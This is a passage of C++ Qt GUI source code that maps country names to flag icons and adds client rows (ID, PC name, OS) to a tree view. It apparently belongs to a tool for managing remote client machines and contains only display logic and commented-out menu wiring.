		iconPath = QString(":icons/country/icons/country/Rwanda.png");
	else if (country.contains("Saint Lucia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Saint Lucia.png");
	else if (country.contains("Samoa", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Samoa.png");
	else if (country.contains("San Marino", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/San Marino.png");
	else if (country.contains("Sao Tome & Principe", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Sao Tome & Principe.png");
	else if (country.contains("Saudi Arabia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Saudi Arabia.png");


	if (country.contains("Scotland", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Scotland.png");
	else if (country.contains("Senegal", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Senegal.png");
	else if (country.contains("Serbia(Yugoslavia)", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Serbia(Yugoslavia).png");
	else if (country.contains("Seychelles", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Seychelles.png");
	else if (country.contains("Sierra Leone", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Sierra Leone.png");
	else if (country.contains("Singapore", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Singapore.png");
	else if (country.contains("Slovakia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Slovakia.png");
	else if (country.contains("Slovenia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Slovenia.png");
	else if (country.contains("Solomon Islands", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Solomon Islands.png");
	else if (country.contains("Somalia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Somalia.png");
	else if (country.contains("Somaliland", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Somaliland.png");
	else if (country.contains("South Africa", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/South Africa.png");
	else if (country.contains("South Korea", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/South Korea.png");
	else if (country.contains("Spain", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Spain.png");
	else if (country.contains("Sri Lanka", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Sri Lanka.png");
	else if (country.contains("St Kitts & Nevis", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/St Kitts & Nevis.png");
	else if (country.contains("St Vincent & the Grenadines", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/St Vincent & the Grenadines.png");
	else if (country.contains("Sudan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Sudan.png");
	else if (country.contains("Suriname", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Suriname.png");
	else if (country.contains("Swaziland", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Swaziland.png");
	else if (country.contains("Sweden", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Sweden.png");
	else if (country.contains("Switzerland", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Switzerland.png");
	else if (country.contains("Syria", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Syria.png");
	else if (country.contains("Tahiti(French Polinesia)", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Tahiti(French Polinesia).png");
	else if (country.contains("Taiwan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Taiwan.png");
	else if (country.contains("Tajikistan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Tajikistan.png");
	else if (country.contains("Tanzania", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Tanzania.png");
	else if (country.contains("Thailand", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Thailand.png");
	else if (country.contains("Timor-Leste", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Timor-Leste.png");
	else if (country.contains("Togo", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Togo.png");
	else if (country.contains("Tonga", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Tonga.png");
	else if (country.contains("Trinidad & Tobago", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Trinidad & Tobago.png");
	else if (country.contains("Tunisia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Tunisia.png");
	else if (country.contains("Turkey", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Turkey.png");
	else if (country.contains("Turkmenistan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Turkmenistan.png");
	else if (country.contains("Turks and Caicos Islands", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Turks and Caicos Islands.png");
	else if (country.contains("Tuvalu", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Tuvalu.png");
	else if (country.contains("Uganda", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Uganda.png");
	else if (country.contains("Ukraine", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Ukraine.png");
	else if (country.contains("United Arab Emirates", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/United Arab Emirates.png");
	else if (country.contains("United Kingdom(Great Britain)", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/United Kingdom(Great Britain).png");
	else if (country.contains("United Nations", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/United Nations.png");
	else if (country.contains("United States of America (USA)", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/United States of America (USA).png");
	else if (country.contains("Uruguay", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Uruguay.png");
	else if (country.contains("Uzbekistan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Uzbekistan.png");
	else if (country.contains("Vanutau", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Vanutau.png");
	else if (country.contains("Vatican City", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Vatican City.png");
	else if (country.contains("Venezuela", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Venezuela.png");
	else if (country.contains("Viet Nam", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Viet Nam.png");
	else if (country.contains("Virgin Islands British", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Virgin Islands British.png");
	else if (country.contains("Virgin Islands US", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Virgin Islands US.png");
	else if (country.contains("Wales", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Wales.png");
	else if (country.contains("Western Sahara", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Western Sahara.png");
	else if (country.contains("Yemen", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Yemen.png");
	else if (country.contains("Zambia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Zambia.png");
	else if (country.contains("Zimbabwe", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Zimbabwe.png");

	if (iconPath != "")
	{
		countryIcon.addFile(iconPath, QSize(), QIcon::Normal, QIcon::Off);
		root->setIcon(1, countryIcon);
	}
}


// TO be deleted
/*
 *
 *
 *
 *
 *
 *
 *
 *
 */
void MainGui::addClient(const Client& client)
{
	const bool __sortingEnabled = ui.mainTree->isSortingEnabled();
	ui.mainTree->setSortingEnabled(false);
	QTreeWidgetItem* node = new QTreeWidgetItem(ui.mainTree);
	node->setText(0, QString::number(client.getId()));
	// node->setText(1, c->country);
	// setCountryFlag(node, c->country);
	node->setText(1, client.getPcName());
	node->setText(2, client.getOs());

	ui.mainTree->setSortingEnabled(__sortingEnabled);
}

/*
void MainGui::on_actionClose_triggered(int index)
{
	/*
		connect(actionDesktop, SIGNAL(triggered()), signalMapper, SLOT(map()));
		connect(actionClose, SIGNAL(triggered()), signalMapper, SLOT(map()));
		connect(actionUninstall, SIGNAL(triggered()), signalMapper, SLOT(map()));
		connect(actionCam, SIGNAL(triggered()), signalMapper, SLOT(map()));
		signalMapper->setMapping(actionCam, 0);
		signalMapper->setMapping(actionDesktop, 1);
		signalMapper->setMapping(actionClose, 2);
		signalMapper->setMapping(actionUninstall, 3);
		connect(signalMapper, SIGNAL(mapped(int)), this, SLOT(on_actionClose_triggered(int)));

		*/
/**if (handledContext)
	return;
	handledContext = true;

	if (currentSelected == nullptr)
	return;
	QSignalMapper* mapper = dynamic_cast<QSignalMapper*>(sender());
	QAction* action = dynamic_cast<QAction*>(mapper->mapping(index));
	qDebug(" triggered : " + currentSelected->text(0).toLatin1() + " ------- " + action->text().toLatin1());
	**/
/*
}
*/
